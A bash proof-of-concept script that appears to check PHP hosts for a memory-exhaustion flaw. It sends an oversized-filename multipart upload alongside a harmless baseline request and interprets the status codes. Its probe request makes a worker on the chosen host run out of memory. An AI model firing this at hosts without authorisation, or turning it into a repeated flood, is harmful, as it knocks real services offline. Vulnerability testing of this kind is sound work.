#!/bin/bash
# php2shell-safe-poc: non-destructive OOM probe
#
# Sends ONE multipart request with an oversized filename, tuned so the
# session.upload_progress tracking crosses memory_limit before the request
# reaches application code. This does not attempt code execution; it only
# checks whether the reported pre-userland OOM signature appears.
#
# IMPORTANT — display_errors: the strong "exhausted ... in Unknown on line 0"
# signature only appears in the response body when display_errors=On. With
# display_errors=Off (the security-recommended, common production default),
# a vulnerable host still OOMs but returns a bare 500 with an EMPTY body —
# indistinguishable at the body level from any other unrelated 500. This
# script therefore also sends a harmless baseline request and compares
# status codes, so a status-only flip (500 on the probe, 200 on the
# baseline) is reported as a WEAK/AMBIGUOUS signal rather than silently
# falling through to "unrecognized". A weak signal is NOT a clean bill of
# health — corroborate with host-side error logs or the worker-survival
# check if you have access.
#
# Usage: HOST=<host> PATH_=/index.php [PORT=443] bash scripts/probe_oom.sh
set -u

HOST="${HOST:?set HOST=<target host or ip>}"
PATH_="${PATH_:-/index.php}"
PORT="${PORT:-443}"
BND="UctxPoc2026"
SID="u0123456789abcdefghijklmnopqrstuv"
NAMELEN="${NAMELEN:-1300000}"

WORKDIR="$(mktemp -d)"
trap 'rm -rf "$WORKDIR"' EXIT

{
  printf -- '--%s\r\n' "$BND"
  printf 'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n%s\r\n' "$SID"
  printf -- '--%s\r\n' "$BND"
  printf 'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
  printf -- '--%s\r\n' "$BND"
  printf 'Content-Disposition: form-data; name="f"; filename="'
  python3 -c "import sys; sys.stdout.write('N'*$NAMELEN)"
  printf '"\r\n\r\n'
  python3 -c "import sys; sys.stdout.buffer.write(b'A'*6144)"
  printf '\r\n--%s--\r\n' "$BND"
} > "$WORKDIR/arm_body.bin"

# Baseline: same endpoint, same session/multipart shape, harmless small filename.
# Used only to establish what a normal (non-OOM) status code looks like here,
# so a status-only change on the probe isn't confused with an unrelated fault.
{
  printf -- '--%s\r\n' "$BND"
  printf 'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n%s\r\n' "$SID"
  printf -- '--%s\r\n' "$BND"
  printf 'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
  printf -- '--%s\r\n' "$BND"
  printf 'Content-Disposition: form-data; name="f"; filename="baseline.txt"\r\n\r\n'
  python3 -c "import sys; sys.stdout.write('A'*64)"
  printf '\r\n--%s--\r\n' "$BND"
} > "$WORKDIR/baseline_body.bin"

echo "Sending baseline (harmless) request to https://$HOST:$PORT$PATH_ ..."
BASELINE=$(curl -sk -i -X POST "https://$HOST:$PORT$PATH_" \
  -H "Cookie: PHPSESSID=$SID" \
  -H "Content-Type: multipart/form-data; boundary=$BND" \
  --data-binary @"$WORKDIR/baseline_body.bin")
BASELINE_STATUS=$(echo "$BASELINE" | head -1 | tr -d '\r')
echo "  -> $BASELINE_STATUS"

echo
echo "Sending OOM probe to https://$HOST:$PORT$PATH_ ..."
RESP=$(curl -sk -i -X POST "https://$HOST:$PORT$PATH_" \
  -H "Cookie: PHPSESSID=$SID" \
  -H "Content-Type: multipart/form-data; boundary=$BND" \
  --data-binary @"$WORKDIR/arm_body.bin")

echo "$RESP"
echo
if echo "$RESP" | grep -q "HTTP/1.1 500" && echo "$RESP" | grep -qi "exhausted" && echo "$RESP" | grep -q "line 0"; then
  echo "[RESULT: STRONG] Pre-userland OOM signature observed (500 + 'exhausted ... in Unknown on line 0')."
  echo "                 This indicates the probed code path is reachable. (display_errors=On on this host.)"
elif echo "$RESP" | grep -q "HTTP/1.1 403"; then
  echo "[RESULT] Blocked (403) before reaching the application — likely a WAF/CDN in front."
  echo "         Re-run against the origin directly to test the app, or see verify_waf.sh."
elif echo "$RESP" | grep -q "HTTP/1.1 500" && ! echo "$BASELINE_STATUS" | grep -q "500"; then
  echo "[RESULT: WEAK / AMBIGUOUS] Probe returned 500 with no OOM text in the body, while the"
  echo "                 baseline request returned $BASELINE_STATUS. This is CONSISTENT WITH an OOM"
  echo "                 under display_errors=Off (which suppresses the body text entirely) but is"
  echo "                 NOT confirmation — a 500 can have unrelated causes. Do NOT treat this as a"
  echo "                 clean result either way. Corroborate via host-side error/access logs if you"
  echo "                 have access, or the worker-survival check below."
elif echo "$RESP" | grep -q "HTTP/1.1 200"; then
  echo "[RESULT] Clean 200 — either patched, session.upload_progress disabled, or the"
  echo "         memory_limit/post_max_size ratio doesn't trigger the condition on this build."
  echo "         Note: this does NOT rule out the condition under a different NAMELEN/config —"
  echo "         see docs/RUNBOOK.md for tuning guidance."
else
  echo "[RESULT] Unrecognized response (baseline was $BASELINE_STATUS) — inspect manually."
fi

echo
echo "Follow-up: check whether the worker survived:"
echo "  curl -sk -i \"https://$HOST:$PORT$PATH_\""
